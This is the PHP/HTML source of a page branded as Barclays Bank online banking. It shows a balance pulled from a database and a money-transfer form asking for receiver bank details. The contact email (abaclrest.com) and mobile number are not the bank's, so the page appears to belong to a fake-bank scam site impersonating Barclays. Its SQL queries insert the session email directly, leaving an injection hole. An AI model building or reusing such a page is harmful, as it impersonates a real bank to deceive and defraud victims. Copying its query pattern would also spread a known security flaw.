<?php
session_start();
$conn=new mysqli("localhost","root","","glen");


$email=$_SESSION['email'];



    $sql = "SELECT * FROM frean WHERE email='$email'";
    $result = mysqli_query($conn, $sql);
    
         if (mysqli_num_rows($result) > 0) 
         {

             while($row = mysqli_fetch_assoc($result)) 
                {
					$amount = $row["final"];
					$current = $row["current"];
                }
          
        } 


mysqli_close($conn);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title> Barclays Bank - Account Information</title>
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300&display=swap" rel="stylesheet">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<style>
table,
th,
td {
    border: 2px solid black;
}
</style>
<style>
label {
    display: inline-block;
    width: 400px;
    text-align: right;

}
</style>

<body>



<?php
include 'connection.php';



$email = $_SESSION['email'] ;
$name='';




$sql="select name,number,code,pan,branch,phone,address,email,type,current,initial,final,status,image from frean where email='$email' ";

$row=$conn->query($sql);
if($row->num_rows>0)
{
   

while($data=$row->fetch_assoc())
{?>
	<?php 
	$name=$data['name'];
	$image=$data['image'];
	$number=$data['number'];
	$code=$data['code'];
	$pan=$data['pan'];
	$branch=$data['branch'];
    $email=$data['email'];
	$phone=$data['phone'];
	$address=$data['address'];
	$type=$data['type'];
	$current=$data['current'];
	$initial=$data['initial'];
	$final=$data['final'];
    $status=$data['status'];
	$_SESSION['email'] = $email;
	
	?>


<section style="background:#FFffff;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4" style="margin:0;">
                    <div style="height:15px"></div>
                    <div style="height:55px;background-color:#000066;border:1px solid #000066;width:200px;">
                        <p style="text-align:center;padding-top:10px;"><img src="Image/barclays-log.png"
                                style="width:190px;height:30px;"></p>
                    </div>
                </div>
                         <div class="col-md-4" style="margin-top:20px;">
                   
   <div id="google_translate_element" style="background-color:#000000;opacity:0.6;width:200px;"></div>
    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({ pageLanguage: 'en', includedLanguages: 'zh-CN,cs,da,nl,en,et,fr,vi,hi' }, 'google_translate_element');
        }

    </script>

    <script type="text/javascript"
        src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
                </div>
                   <div class="col-md-4" style="margin:0;">
                    <div style="height:15px"></div>
                    <div style="background-color:#000099;width:270px;height:50px;border:1px solid #000099;">
                        <nav>
                            <a href="mailto:enquirydept@abaclrest.com"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-comment'
                                    style='font-size:24px;padding-top:10px;color:#ffffff;'></i></a>
                            <a href="mailto:enquirydept@abaclrest.com"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-cog' style='font-size:24px;padding-top:10px;color:#ffffff;'></i></a>
                            <a href="callto:+447810389895"
                                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;padding-top:10px;text-indent:1em;"><i
                                    class='fa fa-phone' style='font-size:24px;color:#ffffff;'></i></a>

                            <a href="secured-login.php" style="text-decoration:none;color:#ffffff;font-size:25px;"
                                style="font-family: 'Source Sans Pro', sans-serif;padding-top:10px;color:#ffffff;">
                                &nbsp &nbsp Log Out
                            </a>
                        </nav>
                    </div>
                </div>
            </div>
    </section>
    <div style="height:60px"></div>
    <div class="container">
        <div class="row">
            <div class="col-md-2">
            </div>

            <div class="col-md-8 ">
                <div id="Sign In" align="center">
                    &nbsp <iframe src="//www.exchangerates.org.uk/widget/ER-LRTICKER.php?w=490&s=1&mc=GBP&mbg=F0F0F0&bs=no&bc=000044&f=verdana&fs=10px&fc=000044&lc=000044&lhc=FE9A00&vc=FE9A00&vc
u=008000&vcd=FF0000&" width="600" height="30" frameborder="0" scrolling="no" marginwidth="0" marginheight="0"></iframe>
                </div>
            </div>
            <div class="col-md-2">
            </div>
        </div>
    </div>
    <div style="height:60px"></div>
    <div id="Sign In" align="center">
        <table style="width:100%">
            <tr>
                <td
                    style="width:250px;background-color:#800000;border:1px solid #ffffff;color:#000099;text-align:center;font-size:25px;font-family: 'Source Sans Pro', sans-serif;">
                    <a href="account-holder.php" style="text-decoration:none;color:#ffffff;">OVERVIEW</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:30px;font-family: 'Source Sans Pro', sans-serif;font-size:23px;">
                    <a href="clientinformation.php" style="text-decoration:none;color:#ffffff;">ACCOUNT INFORMATION</a>
                </td>               
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="#" style="text-decoration:none;color:#ffffff;">LOAN</a>
                </td>
                <td
                    style="width:200px;background-color:#800000;border:1px solid #ffffff;color:#ffffff;text-align:center;height:40px;font-family: 'Source Sans Pro', sans-serif;font-size:25px;">
                    <a href="#" style="text-decoration:none;color:#ffffff;">FAQ</a>
                </td>

        </table>
    </div>
    <div class="container" style="height:60px;width:1200px;background-color:#ffa31a;margin-top:20px;">
        <nav style="padding-top:10px;">
            <a href="recent-transfer.php"
                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;text-indent:1em;text-decoration:none;color:#1f1f14;"><i
                    class='fa fa-money' style="font-size:15px;"></i>&nbsp Account Statement</a>
            <a href="/css/"
                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;text-indent:1em;text-decoration:none;color:#1f1f14;"><i
                    class='fa fa-sync' style='font-size:15px;'></i>&nbsp Change Pin</a>
            <a href="/python/"
                style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;text-indent:1em;text-decoration:none;color:#1f1f14;"><i
                    class='fa fa-lock' style='font-size:15px'></i>&nbsp Change Password</a>
        </nav>
    </div>
    <div style="height:40px"></div>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <table style="width:100%;background-color:#f5f5f0;border:1px solid #f5f5f0;">
                    <tr>
                        <td style="background-color:#f5f5f0;border:1px solid #c2c2a3;height:70px;">
                            <table>
                                <tr>
                                    <td
                                        style="width:30px;height:30px;background-color:#f5f5f0;border-top:2px solid #f5f5f0;border-bottom:2px solid #f5f5f0;border-left:2px solid #f5f5f0;border-right:2px solid #ff9900;">
                                    </td>
                                    <td
                                        style="width:230px;height:50px;border:2px solid #ff9900;background-color:#000000;font-size:25px;font-family: 'Source Sans Pro', sans-serif;text-align:center;color:#ffffff;">
                                        Cheque Deposit</td>
                                </tr>

                            </table>
                        </td>
                    </tr>
                </table>
                <table style="width:100%;background-color:#f5f5f0;border:1px solid #f5f5f0;">
                    <tr>
                        <td style="background-color:#f5f5f0;border:1px solid #c2c2a3;width:100%;">

                            <div style="height:40px"></div>
                            <div class="block">
                                <label><b>From</b> &nbsp </label>
                                <select name='current' title="Enter Currency"
                                    style="width:300px;height:40px;font-size:20px;">
                                    <option selected><?=@$current?> <?=@$amount?></option>
                                </select>
                            </div><br>
                            <form action="account-loggs.php">
                                <div class="block">
                                    <label><b>Amount Requested</b> &nbsp </label>
                                    <input type="text" id="fname" name="amount"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>
                                <div class="block">
                                    <label><b>Receiver Name</b> &nbsp </label>
                                    <input type="text" id="fname" name="name"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>
                                <div class="block">
                                    <label><b>Receiver's Bank Name</b> &nbsp </label>
                                    <input type="text" id="fname" name="bank"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>
                                <div class="block">
                                    <label><b>Receiver Account Number</b> &nbsp </label>
                                    <input type="text" id="fname" name="number"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>                                
                                <div class="block">
                                    <label><b>Receiver's Swift Code</b> &nbsp </label>
                                    <input type="text" id="fname" name="code"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>
                                <div class="block">
                                    <label><b>Pan / Iban Number</b> &nbsp </label>
                                    <input type="text" id="fname" name="iban"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>
                                <div class="block">
                                    <label><b>Receiver's Bank Branch</b> &nbsp </label>
                                    <input type="text" id="fname" name="branch"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>
                                <div class="block">
                                    <label><b>Email Address</b> &nbsp </label>
                                    <input type="text" id="fname" name="email"
                                        style="width:300px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" />
                                </div><br>
                                <div class="block">
                                    <label><b>Description</b> &nbsp </label>
                                    <textarea name="comment" placeholder="Narration"
                                        style="width:500px;height:40px;background-color:#d6d6c2;border:1px solid #d6d6c2;text-indent:1em;" /></textarea>
                                </div> <br>
                                <div style="Sign In" align="center">
                                    <div class="submit"><input name="submit" value="Transfer Now"
                                            onclick='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("ctl00$ContentPlaceHolder1$SUBMIT", "", true, "chk", "", false, false))'
                                            id="ctl00_ContentPlaceHolder1=SUBMIT"
                                            class="btn btn-block bg-default btn-flat "
                                            style="width:140px; color:#fff;  margin-bottom:30px; background:#D4090C;"
                                            type="submit"></div>
                                </div>
                            </form>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>




<?php
}
}
else
{?>


<!---  HEADER  END------------->
	
<div class="section"><br><br><br><br><br><br>
<div style="width:400px;height:230px;border:1px solid black; background-color:white;margin:auto;padding:5px;float:center;">
<div id="Sign-In" align="center" ><br><br>
<p style="color:#001f4d"><span style="font-family:calibri;font-size:20px;">Incorrect Account Holder or O.T.P Password.</span></p>
<p style="color:#001f4d"><span style="font-family:calibri;font-size:20px;">Contact your Account Officer.</span></p>
<a href="online-banking.php"><img src="logout.jpg" style="width:80px"></a>
</div>	
</div>
<?php
}







?>









            
                                              
                                             </div>
                                 </div> 
       
                </div>
        </div>
</section>










    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>


document.getElementsByClassName('list-group-item')[0].style.backgroundColor = "#046469";
document.getElementsByClassName('menu-list')[0].style.color = "#fff";

 
    </script>

 
</body>